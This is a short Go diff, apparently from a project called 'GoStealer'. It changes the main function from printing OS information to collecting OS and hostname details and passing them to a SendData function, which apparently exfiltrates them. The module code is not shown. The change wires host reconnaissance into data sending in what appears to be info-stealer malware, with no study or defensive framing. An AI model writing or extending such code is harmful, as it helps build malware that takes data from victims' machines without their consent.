@@ -2,11 +2,12 @@ package main
 
 import (
 	Modules "GoStealer/modules"
-	"fmt"
 )
 
 func main() {
-	fmt.Println(Modules.OsInfo())
+	a := Modules.OsInfo()
+	b := Modules.HostnameInfo()
+	Modules.SendData(a, b)
 }
 
 func ReadFile() {
